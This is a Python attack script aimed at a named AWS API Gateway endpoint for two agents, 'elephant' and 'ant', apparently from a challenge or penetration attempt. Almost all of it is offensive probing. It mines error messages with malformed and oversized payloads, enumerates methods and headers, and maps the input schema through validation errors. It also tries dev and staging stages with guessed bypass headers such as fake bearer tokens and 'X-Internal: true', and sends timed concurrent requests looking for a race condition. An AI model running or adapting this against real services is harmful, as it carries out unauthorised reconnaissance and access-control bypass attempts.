#!/usr/bin/env python3
"""
ELEPHANT & ANT ERROR RESPONSE EXPLOITER
Exploit the error responses we're getting to extract information
"""
import requests
import json

BASE = "https://6ofr2p56t1.execute-api.us-east-1.amazonaws.com/prod/api"

def attack(agent, method="POST", **kwargs):
    try:
        if method == "GET":
            r = requests.get(f"{BASE}/{agent}", **kwargs)
        elif method == "PUT":
            r = requests.put(f"{BASE}/{agent}", **kwargs)
        elif method == "PATCH":
            r = requests.patch(f"{BASE}/{agent}", **kwargs)
        elif method == "DELETE":
            r = requests.delete(f"{BASE}/{agent}", **kwargs)
        elif method == "OPTIONS":
            r = requests.options(f"{BASE}/{agent}", **kwargs)
        else:
            r = requests.post(f"{BASE}/{agent}", **kwargs)
        return r.text, r.status_code, r.headers
    except Exception as e:
        return str(e), 0, {}

print("ðŸ’¥ ERROR RESPONSE EXPLOITER - ELEPHANT & ANT")
print("="*80)

# EXPLOIT 1: Extract info from error messages
print("\n[1] ERROR MESSAGE MINING")
for agent in ['elephant', 'ant']:
    print(f"\n{agent.upper()}:")

    # Try to get detailed error messages
    error_triggers = [
        ('POST', {'json': {'message': 'x' * 100000}}),  # Oversized payload
        ('POST', {'json': {'message': 'model', 'extra_field': 'test'}}),  # Extra fields
        ('POST', {'data': '{"message": "' + 'A'*10000}),  # Incomplete JSON
        ('POST', {'json': {'message': {'nested': 'object'}}}),  # Wrong type
    ]

    for method, kwargs in error_triggers:
        kwargs['timeout'] = 2
        resp, status, headers = attack(agent, method, **kwargs)
        if status not in [504, 0] and len(resp) > 50:
            print(f"  ðŸŽ¯ Status {status}: {resp[:200]}")
            # Check headers for info leakage
            for header, value in headers.items():
                if any(k in header.lower() for k in ['server', 'x-', 'lambda', 'api', 'version']):
                    print(f"     Header: {header}: {value}")

# EXPLOIT 2: OPTIONS method for API discovery
print("\n[2] OPTIONS METHOD (API Discovery)")
for agent in ['elephant', 'ant']:
    print(f"\n{agent.upper()}:")
    resp, status, headers = attack(agent, "OPTIONS", timeout=2)
    print(f"  Status: {status}")
    if headers:
        for header, value in headers.items():
            print(f"    {header}: {value}")

# EXPLOIT 3: Exploit 405 responses with custom headers
print("\n[3] METHOD NOT ALLOWED EXPLOITATION")
for agent in ['elephant', 'ant']:
    print(f"\n{agent.upper()}:")
    methods = ['GET', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS']
    for method in methods:
        # Add headers that might reveal info in error
        headers = {
            'X-Requested-With': 'XMLHttpRequest',
            'X-Debug': 'true',
            'X-Verbose-Errors': 'true',
            'Accept': 'application/json, text/plain, */*'
        }
        resp, status, hdrs = attack(agent, method, headers=headers, timeout=2)
        if status == 405:
            # Check if Allow header reveals anything
            if 'Allow' in hdrs or 'allow' in hdrs:
                print(f"  {method}: Allow header = {hdrs.get('Allow', hdrs.get('allow'))}")

# EXPLOIT 4: Exploit validation errors for schema discovery
print("\n[4] SCHEMA DISCOVERY via Validation Errors")
for agent in ['elephant', 'ant']:
    print(f"\n{agent.upper()}:")

    # Try different field types to map the schema
    schema_tests = [
        {'message': 123},  # Integer instead of string
        {'message': ['list']},  # List instead of string
        {'message': True},  # Boolean instead of string
        {'message': {'nested': 'object'}},  # Object instead of string
        {'msg': 'test'},  # Wrong field name
        {'MESSAGE': 'test'},  # Case variation
        {},  # Empty object
    ]

    for test_data in schema_tests:
        resp, status, _ = attack(agent, json=test_data, timeout=2)
        if status == 422 and 'detail' in resp:
            print(f"  Schema hint: {resp[:150]}")

# EXPLOIT 5: Exploit /dev and /staging endpoints
print("\n[5] DEV/STAGING ENDPOINT EXPLOITATION")
environments = ['dev', 'staging', 'test', 'qa', 'prod']
for env in environments:
    url_base = f"https://6ofr2p56t1.execute-api.us-east-1.amazonaws.com/{env}/api"
    for agent in ['elephant', 'ant']:
        try:
            # Try with different auth headers
            auth_attempts = [
                {},
                {'Authorization': 'Bearer dev-token'},
                {'X-API-Key': 'test'},
                {'X-Dev-Access': 'true'},
                {'X-Internal': 'true'},
            ]

            for headers in auth_attempts:
                headers['timeout'] = 2
                r = requests.get(f"{url_base}/{agent}", headers=headers, timeout=2)
                if r.status_code not in [403, 404, 504]:
                    print(f"  ðŸŽ¯ {env}/{agent} with {headers}: {r.status_code}")
                    print(f"     Response: {r.text[:200]}")
        except:
            pass

# EXPLOIT 6: Race condition - send request right before timeout
print("\n[6] RACE CONDITION EXPLOITATION")
import time
import threading

results = []

def timed_attack(agent, delay):
    time.sleep(delay)
    try:
        r = requests.post(f"{BASE}/{agent}",
                         json={"message": "model"},
                         timeout=0.1)  # Very short timeout
        results.append((delay, r.status_code, r.text[:100]))
    except Exception as e:
        results.append((delay, 'timeout', str(e)[:50]))

for agent in ['elephant', 'ant']:
    print(f"\n{agent.upper()}:")
    results = []
    threads = []

    # Try requests at different micro-intervals
    for delay in [0, 0.01, 0.02, 0.03, 0.04, 0.05]:
        t = threading.Thread(target=timed_attack, args=(agent, delay))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    for delay, status, resp in results:
        if status != 'timeout':
            print(f"  ðŸŽ¯ Delay {delay}s: Status {status} â†’ {resp}")

print("\n" + "="*80)
print("âœ… ERROR EXPLOITATION COMPLETE")
print("="*80)
